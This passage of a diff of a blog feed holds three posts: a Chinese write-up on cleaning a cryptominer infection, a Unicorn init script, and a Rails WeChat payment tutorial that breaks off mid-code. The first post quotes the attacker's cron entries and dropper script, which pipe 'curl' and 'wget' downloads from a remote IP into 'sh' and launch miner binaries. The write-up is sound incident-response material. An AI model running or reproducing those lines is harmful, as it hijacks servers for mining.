+<span class="nt">-rw-r--r--</span>  1 deployer postgres  100352 Oct 16 05:12 vcredist_x64_8544.dll
+<span class="nt">-rw-r--r--</span>  1 deployer postgres   11264 Oct 12 03:58 vcredist_x86_1071.dll
+<span class="nt">-rw-r--r--</span>  1 deployer postgres   11264 Oct 12 08:50 vcredist_x86_5380.dll
+<span class="nt">-rw-r--r--</span>  1 deployer postgres   81408 Oct 23 04:33 vcredist_x86_7537.dll
+<span class="nt">-rw-r--r--</span>  1 deployer postgres   81408 Oct 13 04:52 vcredist_x86_9105.dll
+<span class="nt">-rw-r--r--</span>  1 deployer postgres   81408 Oct 16 05:12 vcredist_x86_928.dll
+<span class="nt">-rwxrwxrwx</span>  1 deployer postgres  496464 Oct 13 10:06 x3776026004<span class="k">*</span>
+<span class="nt">-rw-------</span>  1 deployer postgres 4676439 Nov  6 12:19 xmr.txt
+</code></pre></div></div>
+
+<p><strong>恶意程序（<code class="language-plaintext highlighter-rouge">x3776026004</code>）植入时间为 2017年10月13号10：06分</strong></p>
+
+<p>查看 <code class="language-plaintext highlighter-rouge">xmr.txt</code> 文件</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>2017-10-13 10:06:31]  <span class="k">*</span> VERSIONS:     XMRig/2.3.1-dev libuv/1.9.1 gcc/6.3.0
+<span class="o">[</span>2017-10-13 10:06:31]  <span class="k">*</span> HUGE PAGES:   available, disabled
+<span class="o">[</span>2017-10-13 10:06:31]  <span class="k">*</span> CPU:          Intel<span class="o">(</span>R<span class="o">)</span> Xeon<span class="o">(</span>R<span class="o">)</span> CPU E5-26xx v3 <span class="o">(</span>1<span class="o">)</span> x64 AES-NI
+<span class="o">[</span>2017-10-13 10:06:31]  <span class="k">*</span> CPU L2/L3:    24.0 MB/0.0 MB
+<span class="o">[</span>2017-10-13 10:06:31]  <span class="k">*</span> THREADS:      6, cryptonight, <span class="nv">av</span><span class="o">=</span>1, <span class="nv">donate</span><span class="o">=</span>0%
+<span class="o">[</span>2017-10-13 10:06:31]  <span class="k">*</span> POOL <span class="c">#1:      xmr.crypto-pool.fr:80</span>
+<span class="o">[</span>2017-10-13 10:06:31]  <span class="k">*</span> COMMANDS:     <span class="s1">'h'</span> hashrate, <span class="s1">'p'</span> pause, <span class="s1">'r'</span> resume
+<span class="o">[</span>2017-10-13 10:06:31] use pool xmr.crypto-pool.fr:80 163.172.226.114
+<span class="o">[</span>2017-10-13 10:06:31] new job from xmr.crypto-pool.fr:80 diff 50000
+<span class="o">[</span>2017-10-13 10:06:37] new job from xmr.crypto-pool.fr:80 diff 50000
+<span class="o">[</span>2017-10-13 10:06:47] new job from xmr.crypto-pool.fr:80 diff 50000
+</code></pre></div></div>
+
+<p>访问地址 <code class="language-plaintext highlighter-rouge">xmr.crypto-pool.fr</code></p>
+
+<p><img src="https://user-images.githubusercontent.com/4188624/32473858-42dc9ed4-c32f-11e7-9e9c-822021dc38f4.png" alt="xmr_crypto-pool_fr" /></p>
+
+<p><strong>这个恶意程序为一个是挖矿程序</strong></p>
+
+<p>检查 <code class="language-plaintext highlighter-rouge">/var/spool/cron/crontabs/</code>
+发现有定时任务执行</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>/1 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> curl <span class="nt">-L</span> http://218.248.40.228:8443/i.sh | sh
+<span class="k">*</span>/1 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> wget <span class="nt">-q</span> http://218.248.40.228:8443/i.sh <span class="nt">-O</span> - | sh
+</code></pre></div></div>
+
+<p>恶意代码如下</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/bin:/usr/bin:/usr/local/bin:/usr/sbin
+<span class="nb">echo</span> <span class="s2">"*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh | sh"</span> <span class="o">&gt;</span> /var/spool/cron/root
+<span class="nb">echo</span> <span class="s2">"*/5 * * * * wget -q -O- http://218.248.40.228:8443/i.sh | sh"</span> <span class="o">&gt;&gt;</span> /var/spool/cron/root
+<span class="nb">mkdir</span> <span class="nt">-p</span> /var/spool/cron/crontabs
+<span class="nb">echo</span> <span class="s2">"*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh | sh"</span> <span class="o">&gt;</span> /var/spool/cron/crontabs/root
+<span class="nb">echo</span> <span class="s2">"*/5 * * * * wget -q -O- http://218.248.40.228:8443/i.sh | sh"</span> <span class="o">&gt;&gt;</span> /var/spool/cron/crontabs/root
+<span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="s2">"/tmp/ddg.2020"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span>curl <span class="nt">-fsSL</span> http://218.248.40.228:8443/2020/ddg.<span class="si">$(</span><span class="nb">uname</span> <span class="nt">-m</span><span class="si">)</span> <span class="nt">-o</span> /tmp/ddg.2020
+<span class="k">fi
+if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="s2">"/tmp/ddg.2020"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span>wget <span class="nt">-q</span> http://218.248.40.228:8443/2020/ddg.<span class="si">$(</span><span class="nb">uname</span> <span class="nt">-m</span><span class="si">)</span> <span class="nt">-O</span> /tmp/ddg.2020
+<span class="k">fi
+</span><span class="nb">chmod</span> +x /tmp/ddg.2020 <span class="o">&amp;&amp;</span> /tmp/ddg.2020
+ps auxf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nb">grep</span> | <span class="nb">grep </span>Circle_MI | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | xargs <span class="nb">kill
+</span>ps auxf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nb">grep</span> | <span class="nb">grep </span>get.bi-chi.com | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | xargs <span class="nb">kill
+</span>ps auxf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nb">grep</span> | <span class="nb">grep</span> /boot/efi/ | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | xargs <span class="nb">kill</span>
+<span class="c">#ps auxf | grep -v grep | grep ddg.2006 | awk '{print $2}' | kill</span>
+<span class="c">#ps auxf | grep -v grep | grep ddg.2010 | awk '{print $2}' | kill</span>
+</code></pre></div></div>
+
+<h2 id="解决方法">解决方法</h2>
+<ol>
+  <li>关闭访问挖矿服务器的访问 <code class="language-plaintext highlighter-rouge">iptables -A INPUT -s xmr.crypto-pool.fr -j DROP</code> and <code class="language-plaintext highlighter-rouge">iptables -A OUTPUT -d xmr.crypto-pool.fr -j DROP</code></li>
+  <li>检查 <code class="language-plaintext highlighter-rouge">crontab</code> 中的定时任务，删除恶意定时任务</li>
+  <li>杀掉挖矿程序，并清除恶意程序</li>
+  <li>配置 <code class="language-plaintext highlighter-rouge">bind</code> 选项, 限定可以连接 <code class="language-plaintext highlighter-rouge">Redis</code> 服务器的 <code class="language-plaintext highlighter-rouge">IP</code>, 并修改 <code class="language-plaintext highlighter-rouge">redis</code> 的默认端口6379, 配置rename-command 配置项</li>
+  <li>查找 <code class="language-plaintext highlighter-rouge">/tmp</code> 目录是否有发现可以文件，找到并且清除</li>
+  <li>打开 <code class="language-plaintext highlighter-rouge">~/.ssh/authorized_keys</code>, 删除你不认识的账号</li>
+  <li>所有操作完成之后，记得再次使用 <code class="language-plaintext highlighter-rouge">htop</code> 观察一段时间，确保挖矿守护进程已经干掉，挖矿程序没有重新启动服务</li>
+</ol>
+
+<h2 id="参考链接">参考链接</h2>
+
+<ul>
+  <li>http://www.chinaz.com/server/2015/1112/469670.shtml</li>
+  <li>http://53cto.blog.51cto.com/9899631/1826989</li>
+</ul>]]></content><author><name>xifengzhu</name></author><summary type="html"><![CDATA[服务器被植入挖矿程序]]></summary></entry><entry><title type="html">Unicorn auto start after server boot</title><link href="xifengzhu.github.com/2017/08/26/unicorn-auto-start-after-server-boot.html" rel="alternate" type="text/html" title="Unicorn auto start after server boot" /><published>2017-08-26T00:00:00+00:00</published><updated>2017-08-26T00:00:00+00:00</updated><id>xifengzhu.github.com/2017/08/26/unicorn-auto-start-after-server-boot</id><content type="html" xml:base="xifengzhu.github.com/2017/08/26/unicorn-auto-start-after-server-boot.html"><![CDATA[<h3 id="running-unicorn-as-a-service">Running Unicorn as a Service</h3>
+
+<p>Add ${project_name}_unicorn file with follow command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vi /etc/init.d/${project_name}_unicorn
+</code></pre></div></div>
+
+<p>paste follow text:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+
+<span class="c"># File: /etc/init.d/${project_name}_unicorn</span>
+
+<span class="c">### BEGIN INIT INFO</span>
+<span class="c"># Provides:          unicorn</span>
+<span class="c"># Required-Start:    $local_fs $remote_fs $network $syslog</span>
+<span class="c"># Required-Stop:     $local_fs $remote_fs $network $syslog</span>
+<span class="c"># Default-Start:     2 3 4 5</span>
+<span class="c"># Default-Stop:      0 1 6</span>
+<span class="c"># Short-Description: starts the unicorn web server</span>
+<span class="c"># Description:       starts unicorn</span>
+<span class="c">### END INIT INFO</span>
+
+<span class="c"># Feel free to change any of the following variables for your app:</span>
+
+<span class="c"># ubuntu is the default user on Amazon's EC2 Ubuntu instances.</span>
+<span class="nv">USER</span><span class="o">=</span>deployer
+<span class="c"># Replace [PATH_TO_RAILS_ROOT_FOLDER] with your application's path. I prefer</span>
+<span class="c"># /srv/app-name to /var/www. The /srv folder is specified as the server's</span>
+<span class="c"># "service data" folder, where services are located. The /var directory,</span>
+<span class="c"># however, is dedicated to variable data that changes rapidly, such as logs.</span>
+<span class="c"># Reference https://help.ubuntu.com/community/LinuxFilesystemTreeOverview for</span>
+<span class="c"># more information.</span>
+<span class="nv">APP_ROOT</span><span class="o">=</span><span class="s2">"/var/www/</span><span class="k">${</span><span class="nv">project_name</span><span class="k">}</span><span class="s2">/current"</span>
+<span class="c"># Set the environment. This can be changed to staging or development for staging</span>
+<span class="c"># servers.</span>
+<span class="nv">RAILS_ENV</span><span class="o">=</span>production
+<span class="c"># This should match the pid setting in $APP_ROOT/config/unicorn.rb.</span>
+<span class="nv">PID</span><span class="o">=</span><span class="nv">$APP_ROOT</span>/tmp/pids/unicorn.pid
+<span class="c"># A simple description for service output.</span>
+<span class="nv">DESC</span><span class="o">=</span><span class="s2">"Unicorn app - </span><span class="nv">$RAILS_ENV</span><span class="s2">"</span>
+<span class="c"># If you're using rbenv, you may need to use the following setup to get things</span>
+<span class="c"># Unicorn can be run using `bundle exec unicorn` or `bin/unicorn`.</span>
+<span class="nv">UNICORN</span><span class="o">=</span><span class="s2">"bin/bundle exec unicorn"</span>
+<span class="c"># Execute the unicorn executable as a daemon, with the appropriate configuration</span>
+<span class="c"># and in the appropriate environment.</span>
+<span class="nv">UNICORN_OPTS</span><span class="o">=</span><span class="s2">"-c </span><span class="nv">$APP_ROOT</span><span class="s2">/config/unicorn/</span><span class="nv">$RAILS_ENV</span><span class="s2">.rb -E </span><span class="nv">$RAILS_ENV</span><span class="s2"> -D"</span>
+<span class="nv">CMD</span><span class="o">=</span><span class="s2">"cd </span><span class="nv">$APP_ROOT</span><span class="s2"> &amp;&amp; </span><span class="nv">$UNICORN</span><span class="s2"> </span><span class="nv">$UNICORN_OPTS</span><span class="s2">"</span>
+<span class="c"># Give your upgrade action a timeout of 60 seconds.</span>
+<span class="nv">TIMEOUT</span><span class="o">=</span>60
+
+<span class="c"># Store the action that we should take from the service command's first</span>
+<span class="c"># argument (e.g. start, stop, upgrade).</span>
+<span class="nv">action</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
+
+<span class="c"># Make sure the script exits if any variables are unset. This is short for</span>
+<span class="c"># set -o nounset.</span>
+<span class="nb">set</span> <span class="nt">-u</span>
+
+<span class="c"># Set the location of the old pid. The old pid is the process that is getting</span>
+<span class="c"># replaced.</span>
+<span class="nv">old_pid</span><span class="o">=</span><span class="s2">"</span><span class="nv">$PID</span><span class="s2">.oldbin"</span>
+
+<span class="c"># Make sure the APP_ROOT is actually a folder that exists. An error message from</span>
+<span class="c"># the cd command will be displayed if it fails.</span>
+<span class="nb">cd</span> <span class="nv">$APP_ROOT</span> <span class="o">||</span> <span class="nb">exit </span>1
+
+<span class="c"># A function to send a signal to the current unicorn master process.</span>
+sig <span class="o">()</span> <span class="o">{</span>
+  <span class="nb">test</span> <span class="nt">-s</span> <span class="s2">"</span><span class="nv">$PID</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">kill</span> -<span class="nv">$1</span> <span class="sb">`</span><span class="nb">cat</span> <span class="nv">$PID</span><span class="sb">`</span>
+<span class="o">}</span>
+
+<span class="c"># Send a signal to the old process.</span>
+oldsig <span class="o">()</span> <span class="o">{</span>
+  <span class="nb">test</span> <span class="nt">-s</span> <span class="nv">$old_pid</span> <span class="o">&amp;&amp;</span> <span class="nb">kill</span> -<span class="nv">$1</span> <span class="sb">`</span><span class="nb">cat</span> <span class="nv">$old_pid</span><span class="sb">`</span>
+<span class="o">}</span>
+
+<span class="c"># A switch for handling the possible actions to take on the unicorn process.</span>
+<span class="k">case</span> <span class="nv">$action</span> <span class="k">in</span>
+  <span class="c"># Start the process by testing if it's there (sig 0), failing if it is,</span>
+  <span class="c"># otherwise running the command as specified above.</span>
+  start<span class="p">)</span>
+    sig 0 <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="o">&gt;</span>&amp;2 <span class="s2">"</span><span class="nv">$DESC</span><span class="s2"> is already running"</span> <span class="o">&amp;&amp;</span> <span class="nb">exit </span>0
+    su - <span class="nv">$USER</span> <span class="nt">-c</span> <span class="s2">"</span><span class="nv">$CMD</span><span class="s2">"</span>
+    <span class="p">;;</span>
+
+  <span class="c"># Graceful shutdown. Send QUIT signal to the process. Requests will be</span>
+  <span class="c"># completed before the processes are terminated.</span>
+  stop<span class="p">)</span>
+    sig QUIT <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"Stopping </span><span class="nv">$DESC</span><span class="s2">"</span> <span class="nb">exit </span>0
+    <span class="nb">echo</span> <span class="o">&gt;</span>&amp;2 <span class="s2">"Not running"</span>
+    <span class="p">;;</span>
+
+  <span class="c"># Quick shutdown - kills all workers immediately.</span>
+  force-stop<span class="p">)</span>
+    sig TERM <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"Force-stopping </span><span class="nv">$DESC</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">exit </span>0
+    <span class="nb">echo</span> <span class="o">&gt;</span>&amp;2 <span class="s2">"Not running"</span>
+    <span class="p">;;</span>
+
+  <span class="c"># Graceful shutdown and then start.</span>
+  restart<span class="p">)</span>
+    sig QUIT <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"Restarting </span><span class="nv">$DESC</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">sleep </span>2 <span class="se">\</span>
+      <span class="o">&amp;&amp;</span> su - <span class="nv">$USER</span> <span class="nt">-c</span> <span class="s2">"</span><span class="nv">$CMD</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">exit </span>0
+    <span class="nb">echo</span> <span class="o">&gt;</span>&amp;2 <span class="s2">"Couldn't restart."</span>
+    <span class="p">;;</span>
+
+  <span class="c"># Reloads config file (unicorn.rb) and gracefully restarts all workers. This</span>
+  <span class="c"># command won't pick up application code changes if you have `preload_app</span>
+  <span class="c"># true` in your unicorn.rb config file.</span>
+  reload<span class="p">)</span>
+    sig HUP <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"Reloading configuration for </span><span class="nv">$DESC</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">exit </span>0
+    <span class="nb">echo</span> <span class="o">&gt;</span>&amp;2 <span class="s2">"Couldn't reload configuration."</span>
+    <span class="p">;;</span>
+
+  <span class="c"># Re-execute the running binary, then gracefully shutdown old process. This</span>
+  <span class="c"># command allows you to have zero-downtime deployments. The application may</span>
+  <span class="c"># spin for a minute, but at least the user doesn't get a 500 error page or</span>
+  <span class="c"># the like. Unicorn interprets the USR2 signal as a request to start a new</span>
+  <span class="c"># master process and phase out the old worker processes. If the upgrade fails</span>
+  <span class="c"># for some reason, a new process is started.</span>
+  upgrade<span class="p">)</span>
+    <span class="k">if </span>sig USR2 <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"Upgrading </span><span class="nv">$DESC</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">sleep </span>10 <span class="se">\</span>
+      <span class="o">&amp;&amp;</span> sig 0 <span class="o">&amp;&amp;</span> oldsig QUIT
+    <span class="k">then
+      </span><span class="nv">n</span><span class="o">=</span><span class="nv">$TIMEOUT</span>
+      <span class="k">while </span><span class="nb">test</span> <span class="nt">-s</span> <span class="nv">$old_pid</span> <span class="o">&amp;&amp;</span> <span class="nb">test</span> <span class="nv">$n</span> <span class="nt">-ge</span> 0
+      <span class="k">do
+        </span><span class="nb">printf</span> <span class="s1">'.'</span> <span class="o">&amp;&amp;</span> <span class="nb">sleep </span>1 <span class="o">&amp;&amp;</span> <span class="nv">n</span><span class="o">=</span><span class="k">$((</span> <span class="nv">$n</span> <span class="o">-</span> <span class="m">1</span> <span class="k">))</span>
+      <span class="k">done
+      </span><span class="nb">echo
+
+      </span><span class="k">if </span><span class="nb">test</span> <span class="nv">$n</span> <span class="nt">-lt</span> 0 <span class="o">&amp;&amp;</span> <span class="nb">test</span> <span class="nt">-s</span> <span class="nv">$old_pid</span>
+      <span class="k">then
+        </span><span class="nb">echo</span> <span class="o">&gt;</span>&amp;2 <span class="s2">"</span><span class="nv">$old_pid</span><span class="s2"> still exists after </span><span class="nv">$TIMEOUT</span><span class="s2"> seconds"</span>
+        <span class="nb">exit </span>1
+      <span class="k">fi
+      </span><span class="nb">exit </span>0
+    <span class="k">fi
+    </span><span class="nb">echo</span> <span class="o">&gt;</span>&amp;2 <span class="s2">"Couldn't upgrade, starting 'su - </span><span class="nv">$USER</span><span class="s2"> -c </span><span class="se">\"</span><span class="nv">$CMD</span><span class="se">\"</span><span class="s2">' instead"</span>
+    su - <span class="nv">$USER</span> <span class="nt">-c</span> <span class="s2">"</span><span class="nv">$CMD</span><span class="s2">"</span>
+    <span class="p">;;</span>
+
+  <span class="c"># A basic status checker. Just checks if the master process is responding to</span>
+  <span class="c"># the `kill` command.</span>
+  status<span class="p">)</span>
+    sig 0 <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="o">&gt;</span>&amp;2 <span class="s2">"</span><span class="nv">$DESC</span><span class="s2"> is running."</span> <span class="o">&amp;&amp;</span> <span class="nb">exit </span>0
+    <span class="nb">echo</span> <span class="o">&gt;</span>&amp;2 <span class="s2">"</span><span class="nv">$DESC</span><span class="s2"> is not running."</span>
+    <span class="p">;;</span>
+
+  <span class="c"># Reopen all logs owned by the master and all workers.</span>
+  reopen-logs<span class="p">)</span>
+    sig USR1
+    <span class="p">;;</span>
+
+  <span class="c"># Any other action gets the usage message.</span>
+  <span class="k">*</span><span class="p">)</span>
+    <span class="c"># Usage</span>
+    <span class="nb">echo</span> <span class="o">&gt;</span>&amp;2 <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> &lt;start|stop|restart|reload|upgrade|force-stop|reopen-logs&gt;"</span>
+    <span class="nb">exit </span>1
+    <span class="p">;;</span>
+<span class="k">esac</span>
+
+</code></pre></div></div>
+
+<h3 id="make-sure-your-init-script-has-permission-to-be-executed">Make sure your init script has permission to be executed</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo chmod +x /etc/init.d/${project_name}_unicorn
+</code></pre></div></div>
+
+<p>Now, you can run sudo service unicorn start to start your unicorn process</p>
+
+<h3 id="add-your-script-to-the-default-runlevels">Add your script to the default runlevels</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo update-rc.d ${project_name}_unicorn defaults
+</code></pre></div></div>
+
+<p>So that your script will be executed by every reboot.</p>]]></content><author><name>xifengzhu</name></author><summary type="html"><![CDATA[Running Unicorn as a Service]]></summary></entry><entry><title type="html">Rails 微信小程序支付</title><link href="xifengzhu.github.com/rails/2017/07/08/rails-%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%94%AF%E4%BB%98.html" rel="alternate" type="text/html" title="Rails 微信小程序支付" /><published>2017-07-08T00:00:00+00:00</published><updated>2017-07-08T00:00:00+00:00</updated><id>xifengzhu.github.com/rails/2017/07/08/rails-%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%94%AF%E4%BB%98</id><content type="html" xml:base="xifengzhu.github.com/rails/2017/07/08/rails-%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%94%AF%E4%BB%98.html"><![CDATA[<p>Rails 微信小程序支付</p>
+
+<h3 id="prepare">Prepare</h3>
+<ol>
+  <li>
+    <p>在公众平台注册一个小程序账号 <a href="https://mp.weixin.qq.com/cgi-bin/registermidpage?action=index&amp;lang=zh_CN">点击入口</a>
+<img src="/assets/images/微信公众平台.png" alt="微信公众平台.png" /></p>
+  </li>
+  <li>
+    <p>申请微信支付
+<img src="/assets/images/申请支付.jpg" alt="申请支付.jpg" /></p>
+  </li>
+  <li>
+    <p>配置商户信息
+申请微信支付成功后，登陆商户平台(pay.weixin.qq.com)进入账户中心，设置微信商户的API Key与下载证书</p>
+  </li>
+  <li>
+    <p>配置Https服务器
+可以参考：<a href="http://xifengzhu.github.io/%E9%83%A8%E7%BD%B2/2017/05/09/%E4%BD%BF%E7%94%A8-Let-s-Encrypt-%E5%8A%A0%E5%AF%86(HTTPS)%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99.html">使用 Let’s Encrypt 加密(HTTPS)你的网站</a></p>
+  </li>
+</ol>
+
+<h3 id="rails-服务端">Rails 服务端</h3>
+
+<h4 id="installation-gem">Installation gem</h4>
+
+<p>Add this line to your Gemfile:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gem</span> <span class="s1">'wx_pay'</span>
+</code></pre></div></div>
+
+<p>And then execute:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bundle <span class="nb">install</span>
+</code></pre></div></div>
+
+<h4 id="config">Config</h4>
+
+<p>Create config/initializers/wx_pay.rb and put following configurations into it.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># required</span>
+<span class="no">WxPay</span><span class="p">.</span><span class="nf">appid</span> <span class="o">=</span> <span class="s1">'YOUR_APPID'</span>
+<span class="no">WxPay</span><span class="p">.</span><span class="nf">key</span> <span class="o">=</span> <span class="s1">'YOUR_KEY'</span>
+<span class="no">WxPay</span><span class="p">.</span><span class="nf">mch_id</span> <span class="o">=</span> <span class="s1">'YOUR_MCH_ID'</span>
+<span class="no">WxPay</span><span class="p">.</span><span class="nf">debug_mode</span> <span class="o">=</span> <span class="kp">true</span> <span class="c1"># default is `true`</span>
+
+<span class="c1"># cert, see https://pay.weixin.qq.com/wiki/doc/api/app/app.php?chapter=4_3</span>
+<span class="c1"># using PCKS12</span>
+<span class="no">WxPay</span><span class="p">.</span><span class="nf">set_apiclient_by_pkcs12</span><span class="p">(</span><span class="no">File</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">pkcs12_filepath</span><span class="p">),</span> <span class="n">pass</span><span class="p">)</span>
+
+<span class="c1"># if you want to use `generate_authorize_req` and `authenticate`</span>
+<span class="no">WxPay</span><span class="p">.</span><span class="nf">appsecret</span> <span class="o">=</span> <span class="s1">'YOUR_SECRET'</span>
+
+<span class="c1"># optional - configurations for RestClient timeout, etc.</span>
+<span class="no">WxPay</span><span class="p">.</span><span class="nf">extra_rest_client_options</span> <span class="o">=</span> <span class="p">{</span><span class="ss">timeout: </span><span class="mi">2</span><span class="p">,</span> <span class="ss">open_timeout: </span><span class="mi">3</span><span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="request-payment-for-miniapp">Request payment for miniapp</h3>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1"># =&gt; {</span>
+  <span class="c1">#    :appId=&gt;"wx6743cf23566a7991",</span>
+  <span class="c1">#    :package=&gt;"prepay_id=wx20170703182440e40cd68a2e0757840067",</span>
+  <span class="c1">#    :nonceStr=&gt;"dpKt531nHFruKbfu",</span>
+  <span class="c1">#    :timeStamp=&gt;"1499077480",</span>
+  <span class="c1">#    :signType=&gt;"MD5",</span>
+  <span class="c1">#    :paySign=&gt;"183385DC3B435FF2164FB0C445DAACCD"</span>
+  <span class="c1">#  }</span>
+  <span class="k">def</span> <span class="nf">request_payment</span>
+    <span class="n">unifiedorder</span> <span class="o">=</span> <span class="no">WxPay</span><span class="o">::</span><span class="no">Service</span><span class="p">.</span><span class="nf">invoke_unifiedorder</span> <span class="n">unifiedorder_params</span>
+    <span class="n">js_payment_params</span> <span class="o">=</span> <span class="p">{</span>
+      <span class="ss">prepayid: </span><span class="n">unifiedorder</span><span class="p">[</span><span class="ss">:raw</span><span class="p">][</span><span class="s2">"xml"</span><span class="p">][</span><span class="s2">"prepay_id"</span><span class="p">],</span>
+      <span class="ss">noncestr: </span><span class="n">unifiedorder</span><span class="p">[</span><span class="ss">:raw</span><span class="p">][</span><span class="s2">"xml"</span><span class="p">][</span><span class="s2">"nonce_str"</span><span class="p">]</span>
+    <span class="p">}</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="no">WxPay</span><span class="o">::</span><span class="no">Service</span><span class="p">.</span><span class="nf">generate_js_pay_req</span> <span class="n">js_payment_params</span>
+    <span class="n">result</span>
+  <span class="k">end</span>
+
+  <span class="c1"># official document for detailed request params and return fields</span>
+  <span class="c1"># https://pay.weixin.qq.com/wiki/doc/api/app/app.php?chapter=9_1</span>
+  <span class="k">def</span> <span class="nf">unifiedorder_params</span>
+    <span class="p">{</span>
+      <span class="ss">body: </span><span class="s1">'商品订单支付'</span><span class="p">,</span>
+      <span class="ss">out_trade_no: </span><span class="s1">'test003'</span><span class="p">,</span>
+      <span class="ss">total_fee: </span><span class="mi">1</span><span class="p">,</span>
+      <span class="ss">spbill_create_ip: </span><span class="s1">'127.0.0.1'</span><span class="p">,</span>
+      <span class="ss">notify_url: </span><span class="s1">'https://youdomain/notify'</span><span class="p">,</span>
+      <span class="ss">trade_type: </span><span class="s1">'JSAPI'</span><span class="p">,</span>
+      <span class="ss">openid: </span><span class="s1">'OPENID'</span>
+    <span class="p">}</span>
+  <span class="k">end</span>
+</code></pre></div></div>
+
+<h3 id="wechat-nimiapp">Wechat nimiapp</h3>
+
+<p>调用服务端的接口获取到必要的参数</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="err">:package=&gt;</span><span class="s2">"prepay_id=wx20170703182440e40cd68a2e0757840067"</span><span class="p">,</span><span class="w">
+  </span><span class="err">:nonceStr=&gt;</span><span class="s2">"dpKt531nHFruKbfu"</span><span class="p">,</span><span class="w">
+  </span><span class="err">:timeStamp=&gt;</span><span class="s2">"1499077480"</span><span class="p">,</span><span class="w">
+  </span><span class="err">:signType=&gt;</span><span class="s2">"MD5"</span><span class="p">,</span><span class="w">
+  </span><span class="err">:paySign=&gt;</span><span class="s2">"183385DC3B435FF2164FB0C445DAACCD"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>将上述服务端返回对应到小程序的参数中去:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">wx</span><span class="p">.</span><span class="nx">requestPayment</span><span class="p">({</span>
+  <span class="dl">'</span><span class="s1">timeStamp</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">1499077480</span><span class="dl">'</span><span class="p">,</span>
+  <span class="dl">'</span><span class="s1">nonceStr</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">dpKt531nHFruKbfu</span><span class="dl">'</span><span class="p">,</span>
+  <span class="dl">'</span><span class="s1">package</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">prepay_id=wx20170703182440e40cd68a2e0757840067</span><span class="dl">'</span><span class="p">,</span>
+  <span class="dl">'</span><span class="s1">signType</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">MD5</span><span class="dl">'</span><span class="p">,</span>
+  <span class="dl">'</span><span class="s1">paySign</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">183385DC3B435FF2164FB0C445DAACCD</span><span class="dl">'</span><span class="p">,</span>
+  <span class="dl">'</span><span class="s1">success</span><span class="dl">'</span><span class="p">:</span> <span class="kd">function</span> <span class="nx">success</span><span class="p">(</span><span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">wx</span><span class="p">.</span><span class="nx">showToast</span><span class="p">({</span>
+      <span class="na">title</span><span class="p">:</span> <span class="dl">'</span><span class="s1">支付成功</span><span class="dl">'</span><span class="p">,</span>
+      <span class="na">icon</span><span class="p">:</span> <span class="dl">'</span><span class="s1">success</span><span class="dl">'</span><span class="p">,</span>
